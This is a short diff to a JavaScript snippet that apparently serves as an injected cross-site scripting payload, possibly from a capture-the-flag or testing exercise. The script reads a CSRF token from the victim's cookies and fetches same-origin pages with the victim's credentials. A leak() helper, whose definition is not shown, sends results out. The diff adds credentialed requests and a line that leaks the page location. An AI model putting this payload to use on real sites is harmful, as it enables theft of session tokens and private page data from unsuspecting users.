@@ -25,12 +25,12 @@ get = function(url)
       leak("get_error","Something went wrong");
    });
    XHR.addEventListener('load', reqListener);
+   XHR.withCredentials = true;
    XHR.open('GET', url);
    XHR.send();
 }
 
 var csrf = document.cookie.split('=')[1];
-
+leak("location",JSON.stringify(document.location));
 get("/");
-get("/documents");
-get("/settings");
+
